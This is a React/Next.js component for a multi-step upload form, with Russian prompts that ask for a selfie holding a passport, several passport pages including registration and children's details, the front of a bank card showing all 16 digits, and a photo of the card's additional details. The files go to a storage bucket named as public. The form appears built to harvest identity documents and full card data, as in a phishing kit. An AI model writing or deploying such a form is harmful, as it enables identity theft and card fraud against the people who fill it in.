import React, { useState } from "react";
import Image from "next/image";
import noimg from "/public/noimage.png";
import { useEdgeStore } from "@/lib/edgestore";
import { useToast } from "../ui/use-toast";
import { Button } from "../ui/button";
import { useRouter } from "next/navigation";

const ImageForm = ({ url, setUrl }: any) => {
	const router = useRouter();
	const { toast } = useToast();
	const { edgestore } = useEdgeStore();
	const [progress, setProgress] = useState(0);
	const [loading, setLoading] = useState(false);
	const [step, setStep] = useState(0);

	const steps = [
		"Фотография с паспортом в руках",
		"Страница с фотографией в паспорте (3 стр)",
		"Страница с текущей пропиской (5-12 стр)",
		"Страница со сведениями о детях (16-17 стр)",
		"Фотография лицевой стороны банковской карты (16 цифр)",
		"Фото банковской карты с необходимыми дополнительными реквизитами",
	];

	const handleNextStep = () => {
		if (step < steps.length - 1) {
			setStep(step + 1);
			setProgress(0);
			setUrl({
				url: "",
				thumbnailUrl: null,
			});
		} else {
			router.push("/success");
		}
	};

	return (
		<div className="p-4 flex flex-col gap-2 rounded bg-stone-50 dark:bg-stone-400">
			<h4 className="text-primary text-center font-semibold text-2xl">
				{steps[step]}
			</h4>
			<div className="flex flex-col items-center gap-4">
				<Image
					src={url?.url !== "" ? url?.url : noimg}
					alt="error"
					width={320}
					height={320}
					className="max-w-80 max-h-80 object-fit rounded-lg border-8"
				/>
				<div className="h-2 w-60 border border-blue-600 rounded overflow-hidden">
					<div
						className="h-full bg-blue-600 transition-all duration-300"
						style={{ width: `${progress}%` }}
					/>
				</div>
				<div className="relative">
					<input
						id="file-upload"
						type="file"
						className="hidden"
						onChange={async (e) => {
							const file = e.target.files?.[0];
							if (file) {
								const maxSize = 5 * 1024 * 1024; // 5 МБ в байтах
								if (file.size > maxSize) {
									toast({
										variant: "destructive",
										description: "максимальный размер",
										duration: 5000,
									});
									e.target.value = "";
								} else {
									setLoading(true);
									const res = await edgestore.myPublicImage.upload({
										file,
										onProgressChange: (progress) => {
											setProgress(progress);
										},
									});
									setUrl({
										url: res.url,
										thumbnailUrl: res.thumbnailUrl,
									});
									setLoading(false);
								}
							}
						}}
					/>
					<label
						htmlFor="file-upload"
						className={`${
							loading ? "bg-blue-300 text-primary hover:bg-blue-300" : ""
						} block w-full py-1 px-4 border bg-blue-500 hover:bg-blue-600 text-white transition-all duration-300 rounded-md cursor-pointer text-center`}>
						<span>{loading ? "Загружается" : "Нажать для загрузки"}</span>
					</label>
				</div>
				{url?.url !== "" ? (
					<Button onClick={handleNextStep}>Далее</Button>
				) : (
					<Button
						size="sm"
						className="bg-black/40 hover:bg-black/40 cursor-not-allowed">
						Далее
					</Button>
				)}
			</div>
		</div>
	);
};

export default ImageForm;
